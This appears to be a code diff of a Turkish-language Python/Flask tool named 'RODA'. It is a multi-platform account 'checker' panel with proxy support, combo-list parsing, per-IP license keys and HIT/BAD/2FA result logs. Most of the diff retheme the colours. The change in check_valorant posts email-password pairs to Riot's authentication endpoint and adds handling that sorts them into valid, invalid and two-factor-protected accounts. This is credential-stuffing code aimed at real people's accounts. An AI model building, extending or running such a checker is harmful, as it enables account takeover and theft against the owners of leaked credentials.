@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-RODA - TAM SİSTEM (SON VERSİYON)
-Renk: #60FF00 + #009fc5 | Login Çalışır | 20 Platform | Log Sistemi
+RODA - TAM SİSTEM (TURUNCU TEMA)
+Renk: #ff6b00 + #7c3aed | Login Çalışır | 20 Platform | Log Sistemi
 """
 
 import os, json, re, time, random, string, threading, concurrent.futures, base64
@@ -112,8 +112,13 @@ def check_valorant(email, password, proxy=None):
                    "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}
         r = requests.post(auth_url, json=payload, headers=headers, timeout=15)
         if r.status_code == 200:
+            data = r.json()
+            if data.get("type") == "multifactor":
+                return {"success": True, "status": "2FA", "error": "2FA gerekli"}
             return {"success": True, "status": "HIT", "error": ""}
-        return {"success": False, "status": "BAD", "error": "Auth failed"}
+        if r.status_code == 401:
+            return {"success": False, "status": "BAD", "error": "Geçersiz kimlik bilgileri"}
+        return {"success": False, "status": "BAD", "error": f"Auth başarısız ({r.status_code})"}
     except Exception as e:
         return {"success": False, "status": "ERROR", "error": str(e)[:60]}
 
@@ -348,7 +353,7 @@ def scan():
     return Response(generate(), mimetype="text/event-stream")
 
 # ============================================================
-# HTML - RENK: #60FF00 + #009fc5 | LOGİN DÜZELTİLDİ
+# HTML - TURUNCU TEMA
 # ============================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -362,16 +367,16 @@ HTML_TEMPLATE = """
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
 body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
-:root{--p:#60FF00;--p2:#009fc5;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(96,255,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
+:root{--p:#ff6b00;--p2:#7c3aed;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(255,107,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
 #login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg)}
-#login-box{width:400px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 20px 50px rgba(96,255,0,0.08)}
+#login-box{width:400px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 20px 50px rgba(255,107,0,0.08)}
 #login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
 .inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
-.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(96,255,0,0.08)}
+.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(255,107,0,0.08)}
 .btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
-.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(96,255,0,0.25)}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,107,0,0.25)}
 .btn.sm{width:auto;padding:8px 16px;font-size:12px}
 .btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
 #sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto}
@@ -381,8 +386,8 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
 .nav-divider{padding:8px 12px;font-size:10px;color:#4a5a70;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
 .nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#8a9bb0;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
-.nav-item:hover{background:rgba(96,255,0,0.06);color:#fff}
-.nav-item.active{background:rgba(96,255,0,0.12);color:var(--p);border-left:3px solid var(--p)}
+.nav-item:hover{background:rgba(255,107,0,0.06);color:#fff}
+.nav-item.active{background:rgba(255,107,0,0.12);color:var(--p);border-left:3px solid var(--p)}
 .nav-item i{font-size:16px;width:22px;text-align:center}
 .sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
 .mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
@@ -411,7 +416,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}
 .result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
 .result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
-.result-row:hover{background:rgba(96,255,0,0.03)}
+.result-row:hover{background:rgba(255,107,0,0.03)}
 .hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#ffab40}
 .method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
 .method.get{background:rgba(0,230,118,0.12);color:var(--g)}
@@ -422,7 +427,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .cat-admin{background:rgba(255,171,64,0.12);color:#ffab40}
 .cat-user{background:rgba(0,230,118,0.12);color:var(--g)}
 .cat-health{background:rgba(68,138,255,0.12);color:#448aff}
-.cat-api{background:rgba(96,255,0,0.12);color:var(--p)}
+.cat-api{background:rgba(255,107,0,0.12);color:var(--p)}
 .cat-genel{background:rgba(255,255,255,0.04);color:#8a9bb0}
 .scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
 .scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
@@ -450,9 +455,9 @@ input:checked+.slider:before{transform:translateX(18px)}
 .proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
 .proxy-area textarea:focus{border-color:var(--p)}
 .checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
-.checker-platform-select button{padding:6px 14px;background:rgba(96,255,0,0.08);border:1px solid rgba(96,255,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
-.checker-platform-select button:hover{background:rgba(96,255,0,0.15);border-color:var(--p);color:#fff}
-.checker-platform-select button.active{background:rgba(96,255,0,0.2);border-color:var(--p);color:var(--p)}
+.checker-platform-select button{padding:6px 14px;background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
+.checker-platform-select button:hover{background:rgba(255,107,0,0.15);border-color:var(--p);color:#fff}
+.checker-platform-select button.active{background:rgba(255,107,0,0.2);border-color:var(--p);color:var(--p)}
 .checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
 .checker-panel.active{display:block}
 .checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
@@ -492,9 +497,9 @@ input:checked+.slider:before{transform:translateX(18px)}
 .parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
 .parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
 .discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
-.discovery-platforms button{padding:4px 12px;background:rgba(96,255,0,0.06);border:1px solid rgba(96,255,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
-.discovery-platforms button:hover{background:rgba(96,255,0,0.12);border-color:var(--p);color:#fff}
-.discovery-platforms button.active{background:rgba(96,255,0,0.15);border-color:var(--p);color:var(--p)}
+.discovery-platforms button{padding:4px 12px;background:rgba(255,107,0,0.06);border:1px solid rgba(255,107,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
+.discovery-platforms button:hover{background:rgba(255,107,0,0.12);border-color:var(--p);color:#fff}
+.discovery-platforms button.active{background:rgba(255,107,0,0.15);border-color:var(--p);color:var(--p)}
 .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
 .stat-card-custom{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px}
 .stat-card-custom h3{font-size:12px;color:var(--muted)}
@@ -502,15 +507,15 @@ input:checked+.slider:before{transform:translateX(18px)}
 .key-ip-input{width:200px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
 .key-ip-input:focus{border-color:var(--p)}
 .parse-tabs{display:flex;gap:10px;margin-bottom:10px}
-.parse-tabs button{padding:6px 16px;background:rgba(96,255,0,0.08);border:1px solid rgba(96,255,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s}
-.parse-tabs button:hover{background:rgba(96,255,0,0.15);border-color:var(--p);color:#fff}
-.parse-tabs button.active{background:rgba(96,255,0,0.2);border-color:var(--p);color:var(--p)}
+.parse-tabs button{padding:6px 16px;background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s}
+.parse-tabs button:hover{background:rgba(255,107,0,0.15);border-color:var(--p);color:#fff}
+.parse-tabs button.active{background:rgba(255,107,0,0.2);border-color:var(--p);color:var(--p)}
 .logs-table{width:100%;border-collapse:collapse;font-size:12px}
-.logs-table th{text-align:left;padding:8px 12px;background:rgba(96,255,0,0.1);color:var(--p);font-weight:600;border-bottom:2px solid var(--border)}
+.logs-table th{text-align:left;padding:8px 12px;background:rgba(255,107,0,0.1);color:var(--p);font-weight:600;border-bottom:2px solid var(--border)}
 .logs-table td{padding:8px 12px;border-bottom:1px solid var(--border)}
 .logs-table .hit{color:var(--g)}.logs-table .bad{color:var(--r)}.logs-table .twofa{color:var(--gold)}.logs-table .error{color:#ffab40}
 .logs-table .chk-status{font-weight:600}
-::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(96,255,0,0.2);border-radius:4px}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(255,107,0,0.2);border-radius:4px}
 </style>
 </head>
 <body>
@@ -747,7 +752,7 @@ var platforms = [
 ];
 
 // ============================================================
-// LOGIN - DÜZELTİLDİ (addEventListener ile)
+// LOGIN - DÜZELTİLDİ
 // ============================================================
 function doLogin() {
     console.log("Login fonksiyonu çalıştı!");
@@ -1429,14 +1434,14 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     print("""
     ╔══════════════════════════════════════════════════════════════════╗
-    ║     🔱 RODA - TAM SİSTEM (SON VERSİYON)                       ║
+    ║     🔱 RODA - TAM SİSTEM (TURUNCU TEMA)                       ║
     ║     http://127.0.0.1:""" + str(port) + """                               ║
     ║     Admin Key: Gizlidir                                       ║
     ║     ✅ 20 Platform | ✅ 2 Parse Modu | ✅ Webhook             ║
     ║     ✅ 1 Key = 1 IP | ✅ Admin Log Sistemi                   ║
     ║     ✅ Key Süresi: Dakika/Saat/Gün                           ║
-    ║     ✅ Renk: #60FF00 + #009fc5                               ║
-    ║     ✅ Login Düzeltildi (addEventListener)                   ║
+    ║     ✅ Valorant API Aktif                                    ║
+    ║     ✅ Login Düzeltildi                                      ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
 
